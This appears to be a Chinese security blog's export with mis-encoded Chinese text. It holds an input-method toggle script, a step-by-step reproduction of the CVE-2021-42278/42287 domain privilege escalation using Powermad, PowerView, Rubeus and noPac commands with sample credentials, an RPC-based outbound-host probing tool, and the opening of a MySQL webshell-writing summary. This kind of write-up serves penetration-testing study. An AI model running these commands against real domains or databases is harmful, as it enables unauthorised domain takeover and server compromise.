    <content><![CDATA[<h1 id="Windowsä¸‹å¿«é€Ÿåˆ‡æ¢å…¨æ‹¼-åŒæ‹¼"><a href="#Windowsä¸‹å¿«é€Ÿåˆ‡æ¢å…¨æ‹¼-åŒæ‹¼" class="headerlink" title="Windowsä¸‹å¿«é€Ÿåˆ‡æ¢å…¨æ‹¼&#x2F;åŒæ‹¼"></a>Windowsä¸‹å¿«é€Ÿåˆ‡æ¢å…¨æ‹¼&#x2F;åŒæ‹¼</h1><h2 id="batæ‰¹å¤„ç†æ–‡ä»¶æ–¹å¼"><a href="#batæ‰¹å¤„ç†æ–‡ä»¶æ–¹å¼" class="headerlink" title="batæ‰¹å¤„ç†æ–‡ä»¶æ–¹å¼"></a>batæ‰¹å¤„ç†æ–‡ä»¶æ–¹å¼</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>


<h3 id="ChangeAll-bat"><a href="#ChangeAll-bat" class="headerlink" title="ChangeAll.bat"></a>ChangeAll.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x1 /f</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>


<h3 id="ChangeDouble-bat"><a href="#ChangeDouble-bat" class="headerlink" title="ChangeDouble.bat"></a>ChangeDouble.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x0 /f</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<h2 id="VBSè„šæœ¬æ–¹å¼"><a href="#VBSè„šæœ¬æ–¹å¼" class="headerlink" title="VBSè„šæœ¬æ–¹å¼"></a>VBSè„šæœ¬æ–¹å¼</h2><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeAll.bat&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeDouble.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="uToolsæ’ä»¶"><a href="#uToolsæ’ä»¶" class="headerlink" title="uToolsæ’ä»¶"></a>uToolsæ’ä»¶</h2><p>ç›®å‰å·²ç»åšæˆäº† uTools æ’ä»¶ , æ’ä»¶åç§° : <code>åˆ‡æ¢å¾®è½¯å…¨æ‹¼</code></p>
<p>é¡¹ç›®åœ°å€: <a href="https://github.com/syyu6/utools-ChangeDouble">https://github.com/syyu6/utools-ChangeDouble</a></p>
<p>And so on â€¦</p>
<h2 id="utoolså¿«æ·å‘½ä»¤"><a href="#utoolså¿«æ·å‘½ä»¤" class="headerlink" title="utoolså¿«æ·å‘½ä»¤"></a>utoolså¿«æ·å‘½ä»¤</h2><h3 id="å®ç°-ps1-è„šæœ¬"><a href="#å®ç°-ps1-è„šæœ¬" class="headerlink" title="å®ç° ps1 è„šæœ¬"></a>å®ç° ps1 è„šæœ¬</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = reg query HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span>; </span><br><span class="line"><span class="variable">$outStr</span> = <span class="variable">$out</span> <span class="operator">-as</span> [<span class="built_in">string</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$outStr</span> <span class="operator">-match</span> <span class="string">&#x27;(Pinyin.+0x)(\d)&#x27;</span>) &#123;<span class="variable">$mode</span> = <span class="variable">$Matches</span>[<span class="number">2</span>] &#125; <span class="keyword">else</span> &#123; <span class="variable">$mode</span> = <span class="number">1</span> &#125;; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> <span class="operator">-as</span> [<span class="built_in">int</span>] <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="variable">$Double</span> = <span class="number">0</span> &#125; <span class="keyword">else</span> &#123; <span class="variable">$Double</span> = <span class="number">1</span> &#125;;</span><br><span class="line">reg.exe add HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span> /t REG_DWORD /d <span class="variable">$Double</span> /f;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>æŠ€å·§</tag>
        <tag>æ‚è°ˆ</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-42278 &amp; CVE-2021-42287 åŸŸææƒ</title>
    <url>/articles/8e808fd4/</url>
    <content><![CDATA[<h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><h3 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a><code>CVE-2021-42278</code></h3><p> ä¸€èˆ¬æ¥è¯´ï¼Œæœºå™¨è´¦å·çš„åå­—åº”è¯¥ä»¥<code>$</code>ç¬¦å·ç»“å°¾çš„ã€‚ä¾‹å¦‚<code>DC$</code>è¡¨ç¤º<code>DC</code>è¿™å°ä¸»æœºçš„è´¦æˆ·åã€‚ä½†æ˜¯å¾®è½¯åªæ˜¯è¿›è¡Œäº†è§„å®šï¼Œå¹¶æ²¡æœ‰éªŒè¯ç¨‹åºå¯¹ç”¨æˆ·åˆ›å»ºçš„ç”¨æˆ·åè¿›è¡ŒéªŒè¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåˆ›å»º<code>DC</code>ç”¨æˆ·åå®Œå…¨æ˜¯å¯ä»¥çš„ã€‚ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯æœºå™¨è´¦å·çš„<code>sAMAccountName</code>å±æ€§ï¼‰</p>
<h3 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a><code>CVE-2021-42287</code></h3><p> ç»“åˆä¸Šé¢é‚£ä¸ªæ¼æ´ï¼Œå¦‚æœåˆ›å»ºäº†ä¸€ä¸ªç”¨æˆ·åä¸º<code>DC</code>çš„è´¦æˆ·ï¼Œæ­¤æ—¶ä½¿ç”¨è¿™ä¸ªè´¦æˆ·å»ç”³è¯·ä¸€å¼ <code>TGT</code>ç¥¨æ®ï¼Œç„¶ååœ¨ç”³è¯·<code>ST</code>ä¹‹å‰ï¼Œå°†è¿™ä¸ªè´¦æˆ·åä¿®æ”¹æ‰æˆ–è€…åˆ é™¤æ‰ï¼Œé‚£ä¹ˆåœ¨è¿›è¡Œç”³è¯·<code>ST</code>çš„æ—¶å€™ï¼Œ<code>KDC</code>åœ¨è¿›è¡ŒéªŒè¯æ—¶å°±æŸ¥ä¸åˆ°è¿™ä¸ªè´¦æˆ·ï¼Œæ­¤æ—¶<code>KDC</code>å°±ä¼šå»æŸ¥æ‰¾<code>DC$</code>è¿™ä¸ªè´¦æˆ·ï¼Œå¦‚æœè¿™ä¸ªè´¦æˆ·å­˜åœ¨çš„è¯ï¼Œæœ€ç»ˆè¿”å›çš„å°±æ˜¯<code>DC$</code>è¿™ä¸ªè´¦æˆ·ç”³è¯·çš„<code>ST</code>ã€‚ä¹Ÿå°±ç›¸å½“äºè·å–åˆ°äº†åŸŸæ§è´¦æˆ·ç”³è¯·çš„é«˜æƒé™æœåŠ¡ç¥¨æ®ã€‚</p>
<h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="æ¼æ´åˆ©ç”¨æ­¥éª¤"><a href="#æ¼æ´åˆ©ç”¨æ­¥éª¤" class="headerlink" title="æ¼æ´åˆ©ç”¨æ­¥éª¤"></a>æ¼æ´åˆ©ç”¨æ­¥éª¤</h3><p>é¦–å…ˆéœ€è¦ä¸€ä¸ªåŸŸå†…ç”¨æˆ·ï¼Œç„¶åææƒè‡³åŸŸç®¡ï¼Œæ¥ç®¡åŸŸæ§ã€‚æ­¥éª¤å¦‚ä¸‹</p>
<ol>
<li>åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·</li>
<li>æ¸…é™¤æœºå™¨è´¦æˆ·çš„<code>SPN</code></li>
<li>ä¿®æ”¹æœºå™¨è´¦æˆ·çš„<code>sAMAccountName</code>å±æ€§å€¼</li>
<li>ä½¿ç”¨æœºå™¨è´¦æˆ·è¯·æ±‚<code>TGT</code></li>
<li>å†æ¬¡ä¿®æ”¹æœºå™¨è´¦æˆ·çš„<code>sAMAccountName</code>å±æ€§å€¼</li>
<li>è·å–é«˜æƒé™<code>ST</code>ç¥¨æ®</li>
</ol>
<ul>
<li><h3 id="1-åˆ›å»ºæœºå™¨ç”¨æˆ·"><a href="#1-åˆ›å»ºæœºå™¨ç”¨æˆ·" class="headerlink" title="1.åˆ›å»ºæœºå™¨ç”¨æˆ·"></a>1.åˆ›å»ºæœºå™¨ç”¨æˆ·</h3></li>
</ul>
<blockquote>
<p>  ä½¿ç”¨ <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>  åˆ›å»ºä¸€ä¸ªæ–°çš„æœºå™¨è´¦æˆ·ï¼Œ <code>syyu$</code></p>
<p>  å½“ç”³è¯·ä¸€ä¸ªæœºå™¨è´¦æˆ·<code>MachineCount</code>æ—¶ï¼Œ<code>SPN</code>ä¼šè‡ªåŠ¨æ³¨å†Œ</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> syyu <span class="literal">-Domain</span> hacker.me <span class="literal">-DomainController</span> dc.hacker.me <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h3 id="2-æ¸…é™¤SPN"><a href="#2-æ¸…é™¤SPN" class="headerlink" title="2.æ¸…é™¤SPN"></a>2.æ¸…é™¤SPN</h3></li>
</ul>
<blockquote>
<p>  ä½¿ç”¨ <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> ä¸‹çš„ <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a> å·¥å…· ï¼Œè¿›è¡Œæ¸…é™¤ </p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="string">&quot;CN=syyu,CN=Computers,DC=hacker,DC=me&quot;</span> <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h3 id="3-ä¿®æ”¹sAMAccountNameå±æ€§"><a href="#3-ä¿®æ”¹sAMAccountNameå±æ€§" class="headerlink" title="3.ä¿®æ”¹sAMAccountNameå±æ€§"></a>3.ä¿®æ”¹sAMAccountNameå±æ€§</h3></li>
</ul>
<blockquote>
<p>   å°† <strong>sAMAccountName</strong> æ”¹ä¸ºåŸŸæ§çš„æœºå™¨è´¦å·å</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp  // æŸ¥è¯¢ åŸŸæ§çš„ä¸»æœºå</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // sAMAccountName æ”¹ä¸ºåŸŸæ§çš„æœºå™¨è´¦å·å</span><br><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;dc&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<ul>
<li><h3 id="4-è¯·æ±‚TGT"><a href="#4-è¯·æ±‚TGT" class="headerlink" title="4.è¯·æ±‚TGT"></a>4.è¯·æ±‚TGT</h3></li>
</ul>
<blockquote>
<p>  ä½¿ç”¨æ›´æ”¹åçš„æœºå™¨åç”³è¯·TGTç¥¨æ®ï¼Œåˆ©ç”¨ <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> å®Œæˆè¯·æ±‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:dc /password:p@ssWord /domain:hacker.me /dc:dc.hacker.me /nowrap</span><br></pre></td></tr></table></figure>

<ul>
<li><h3 id="5-å†æ¬¡ä¿®æ”¹sAMAccountNameå±æ€§å€¼"><a href="#5-å†æ¬¡ä¿®æ”¹sAMAccountNameå±æ€§å€¼" class="headerlink" title="5.å†æ¬¡ä¿®æ”¹sAMAccountNameå±æ€§å€¼"></a>5.å†æ¬¡ä¿®æ”¹sAMAccountNameå±æ€§å€¼</h3></li>
</ul>
<blockquote>
<p>  <code>samaccountname</code>é‡ç½®ä¼šåŸæœ¬çš„ç”¨æˆ·åæˆ–æ”¹ä¸ºå…¶ä»–åŸŸå†…ä¸å­˜åœ¨è´¦æˆ·</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;syyu$&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<ul>
<li><h3 id="6-è·å–é«˜æƒé™STç¥¨æ®"><a href="#6-è·å–é«˜æƒé™STç¥¨æ®" class="headerlink" title="6.è·å–é«˜æƒé™STç¥¨æ®"></a>6.è·å–é«˜æƒé™STç¥¨æ®</h3></li>
</ul>
<blockquote>
<p>  åœ¨é‡‡ç”¨åˆšåˆšè·å–åˆ°çš„<code>TGT</code>è¿›è¡Œ<code>S4U2self</code>è¯·æ±‚æ¥è·å–åŸŸæ§<code>ST</code>ç¥¨æ®ï¼ˆè¿™ä¸ªè¿‡ç¨‹<code>KDC</code>ä¼šå»æŸ¥æ‰¾<code>samaccountname</code>ï¼Œç”±äºåˆšæ‰<code>MachineCount</code>çš„<code>samaccountname</code>ä¸º<code>dc</code>ï¼Œæ‰€ä»¥<code>KDC</code>å›å»æŸ¥æ‰¾è¿™ä¸ª<code>dc</code>ï¼Œæ­¤æ—¶ç”±äºå·²ç»å°†<code>MachineCount</code>çš„<code>samaccountname</code>æ‰€æ›´æ”¹ï¼Œ<code>KDC</code>æŸ¥æ‰¾ä¸åˆ°<code>dc</code>å°±ä¼šåœ¨åé¢åŠ ä¸Š<code>$</code>ç¬¦å»å¯»æ‰¾ï¼Œæ­¤æ—¶æ‰¾åˆ°çš„å°±ä¸ºåŸŸæ§çš„<code>dc$</code>ï¼Œå¹¶å°†å®ƒçš„<code>ST</code>ç¥¨æ®è¿”å›ï¼‰</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot; /altservice:&quot;ldap/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGTå€¼]</span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:&quot;CIFS/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT]</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œæˆ‘ä»¬ä¾¿è·å–äº†<code>DC</code>çš„<code>ST</code>ç¥¨æ®</p>
<h2 id="pocä½¿ç”¨"><a href="#pocä½¿ç”¨" class="headerlink" title="pocä½¿ç”¨"></a>pocä½¿ç”¨</h2><h3 id="sam-the-admin"><a href="#sam-the-admin" class="headerlink" title="sam_the_admin"></a>sam_the_admin</h3><blockquote>
<p>  <a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sam_the_admin.py <span class="string">&quot;god/liukaifeng01:hongrisec@2021@&quot;</span> -dc-ip 192.168.52.138 -shell</span><br></pre></td></tr></table></figure>



<h3 id="noPac-python"><a href="#noPac-python" class="headerlink" title="noPac_python"></a>noPac_python</h3><blockquote>
<p>  <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 noPac.py redteam/saul:<span class="string">&#x27;admin!@#45&#x27;</span> -dc-ip 10.10.10.8 -dc-host owa -shell --impersonate administrator </span><br></pre></td></tr></table></figure>







<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.csdn.net/FHLZLHQ/article/details/121964692">https://blog.csdn.net/FHLZLHQ/article/details/121964692</a></p>
<p><a href="http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p>
<p><a href="https://sairson.cn/index.php/archives/45/">https://sairson.cn/index.php/archives/45/</a></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
<p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
<p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
<p><a href="https://github.com/ricardojba/Invoke-noPac">https://github.com/ricardojba/Invoke-noPac</a></p>
<h2 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h2><p><a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
        <category>æ¼æ´å¤ç°</category>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>åŸŸææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¿‡Windows RPCæ‰¹é‡æ¢æµ‹å‡ºç½‘æœºå™¨</title>
    <url>/articles/44efe9e0/</url>
    <content><![CDATA[<h2 id="WinRpcTest"><a href="#WinRpcTest" class="headerlink" title="WinRpcTest"></a>WinRpcTest</h2><p><a href="https://github.com/syyu6/WinRpcTest">https://github.com/syyu6/WinRpcTest</a></p>
<p>åˆ©ç”¨RPCæœåŠ¡ï¼Œæ‰¹é‡æ¢æµ‹Windowså‡ºç½‘æœºå™¨</p>
<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å®æˆ˜ä¸­ç»å¸¸ç¢°åˆ°å†…ç½‘Windowsæœºå™¨ä¸å‡ºç½‘çš„æƒ…å†µï¼Œä¸€å°ä¸€å°ç™»å½•æµ‹å‡ºç½‘éå¸¸éº»çƒ¦ï¼Œå­¦ä¹ å€¾æ—‹å¸ˆå‚…çš„æ€è·¯ï¼Œåˆ©ç”¨Windows RPCåè®®è¿›è¡Œæ¢æµ‹ï¼Œå¹¶ä¸”æåˆ°ç”¨pythonçš„impacketæ¨¡å—å¯ä»¥æ–¹ä¾¿è°ƒç”¨RPCã€‚äºæ˜¯ä¾¿æœ‰äº†æ­¤å·¥å…·è¿›è¡Œæ‰¹é‡åŒ–æ¢æµ‹ã€‚</p>
<h3 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><ol>
<li>æ‰¹é‡å¯¼å…¥IPåœ°å€ï¼Œå‰ææ˜¯æœ‰è´¦å·å¯†ç ã€‚</li>
<li>æ ¡éªŒå¤±è´¥çš„IPï¼Œå¦‚IPæ ¼å¼é”™è¯¯ã€è¿æ¥è¶…æ—¶ã€è®¤è¯å¤±è´¥ç­‰æƒ…å†µã€‚</li>
<li>é€šè¿‡dnslogéªŒè¯ï¼Œè·å¾—å‡ºç½‘ipï¼Œæ ¼å¼å¦‚192.168.100.101.??????.dnslog.cnï¼Œè¿›è¡Œæ ¼å¼åŒ–å¤„ç†å¹¶å»é‡ã€‚</li>
</ol>
<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WinRpcTest.py [-h] [--target/-t TARGET] [--file/-f FILE] -u USERNAME -p PASSWORD</span><br></pre></td></tr></table></figure>

<p>å•ä¸ªip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python WinRPCtest.py -t 192.168.101.10 -u administrator -p admin123</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶æ‰¹é‡å¯¼å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python WinRPCtest.py -f ips.txt -u administrator -p admin123</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/2022/03/202203061646569106.png" alt="image-20220306152611422"></p>
<h3 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å¢åŠ  nthash å’Œ lmhash è®¤è¯æ–¹å¼</span><br><span class="line">2.æ·»åŠ -oå‚æ•°ï¼Œå°†è¾“å‡ºç»“æœä¿å­˜åˆ°æ–‡ä»¶</span><br></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://github.com/Rvn0xsy/rvn0xsy.github.io/blob/0c31bb921398e9e2b79fb18ab8c4f6a53001ce50/content/post/2022/2022-03-04-windows-rpc.md">https://github.com/Rvn0xsy/rvn0xsy.github.io/blob/0c31bb921398e9e2b79fb18ab8c4f6a53001ce50/content/post/2022/2022-03-04-windows-rpc.md</a></p>
<p><a href="https://payloads.online/archivers/2022-03-04/1/">https://payloads.online/archivers/2022-03-04/1/</a></p>
<p><a href="https://github.com/zeronetworks/cornershot">https://github.com/zeronetworks/cornershot</a></p>
<p><a href="https://s3cur3th1ssh1t.github.io/On-how-to-access-protected-networks/">https://s3cur3th1ssh1t.github.io/On-how-to-access-protected-networks/</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/rpc/protocol-sequence-constants">https://docs.microsoft.com/en-us/windows/win32/rpc/protocol-sequence-constants</a></p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
        <tag>å·¥å…·å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLææƒæ–¹å¼æ€»ç»“</title>
    <url>/articles/82bffd74/</url>
    <content><![CDATA[<h1 id="MySQLææƒæ–¹å¼æ€»ç»“"><a href="#MySQLææƒæ–¹å¼æ€»ç»“" class="headerlink" title="MySQLææƒæ–¹å¼æ€»ç»“"></a>MySQLææƒæ–¹å¼æ€»ç»“</h1><h2 id="os-shell-into-outfile"><a href="#os-shell-into-outfile" class="headerlink" title="os-shell &#x2F; into outfile"></a>os-shell &#x2F; into outfile</h2><ul>
<li>çŸ¥é“ç½‘ç«™ç‰©ç†è·¯å¾„</li>
<li>é«˜æƒé™æ•°æ®åº“ç”¨æˆ·</li>
<li>load_file() å¼€å¯ å³ secure_file_priv æ— é™åˆ¶</li>
<li>ç½‘ç«™è·¯å¾„æœ‰å†™å…¥æƒé™</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure>



<h2 id="æ—¥å¿—æ–‡ä»¶å†™shell"><a href="#æ—¥å¿—æ–‡ä»¶å†™shell" class="headerlink" title="æ—¥å¿—æ–‡ä»¶å†™shell"></a>æ—¥å¿—æ–‡ä»¶å†™shell</h2><ul>
<li>Web æ–‡ä»¶å¤¹å®½æ¾æƒé™å¯ä»¥å†™å…¥</li>
<li>é«˜æƒé™è¿è¡Œ MySQL æˆ–è€… Apache</li>
</ul>
<p>MySQL 5.0 ç‰ˆæœ¬ä»¥ä¸Šä¼šåˆ›å»ºæ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹æ—¥å¿—çš„å…¨å±€å˜é‡æ¥ getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | OFF                             |</span><br><span class="line">| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="built_in">log</span> |</span><br><span class="line">+------------------+---------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>general_log</code> é»˜è®¤å…³é—­ï¼Œ</p>
<p>å¼€å¯å®ƒå¯ä»¥è®°å½•ç”¨æˆ·è¾“å…¥çš„æ¯æ¡å‘½ä»¤ï¼Œä¼šæŠŠå…¶ä¿å­˜åœ¨å¯¹åº”çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚</p>
